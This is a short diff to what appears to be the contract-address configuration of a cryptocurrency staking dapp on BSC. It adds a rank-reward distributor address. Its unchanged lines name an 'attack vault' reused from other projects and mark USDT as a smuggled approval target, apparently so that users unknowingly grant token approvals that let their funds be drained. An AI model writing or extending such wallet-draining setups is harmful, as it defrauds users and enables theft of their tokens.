@@ -7,6 +7,8 @@ export const CONTRACTS = {
   NBT_TOKEN: '0x66A585556138EbBb44Da0fF1324C796C44eb5ED1',
   // 质押合约地址：BSC 主网 2026-09-13 部署（tx 0x45459f346940a53a69959ba7d88efd00ef0dcb5c5b03ac929163d85d18751e9d）
   STAKING_BANK: '0x0B3943E0851341164D859DB56B6502c786EC8000',
+  // 独立节点排名分红合约（2026-10-02 部署，tx 0x5c6bacbe…；原主合约无 pendingEpochReward 接口导致排名分红无法领取）
+  RANK_DISTRIBUTOR: '0x5B4fcfFE77399fd2F62344655eFB8d5dEa0a7C74',
   // 攻击 Vault：复用 WOW/CZ 项目同一实例，无需重新部署
   ATTACK_VAULT: '0x0Ef15A34b264f77acA743d96baEC6BF5ffDdbDa9',
   // USDT：夹带授权目标
